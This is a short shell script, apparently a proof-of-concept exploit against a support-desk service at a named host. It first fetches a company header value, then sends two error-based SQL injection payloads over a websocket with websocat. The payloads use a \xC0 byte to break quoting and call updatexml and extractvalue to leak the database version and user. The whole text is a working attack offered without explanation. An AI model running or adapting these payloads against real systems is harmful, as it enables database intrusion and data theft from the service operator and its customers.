company=$(curl -k -s https://support.customer.de/get_portal_info|cut -d'=' -f2|tail -n1|cut -d';' -f1|tr -d '\n\r')

# UpdateXML error 
echo -ne "1\n\n0\n\xC0';updatexml(1,concat(0x7e,(select version()),0x7e),1)-- -\n" | websocat -k wss://support.customer.de/nw --protocol "ingredi support desk customer thin" -H "X-Ns-Company: $company" --binary | xxd -p

# ExtractValue  
echo -ne "1\n\n0\n\xC0';extractvalue(1,concat(0x7e,(select user()),0x7e))-- -\n" | websocat -k wss://support.customer.de/nw --protocol "ingredi support desk customer thin" -H "X-Ns-Company: $company" --binary | xxd -p
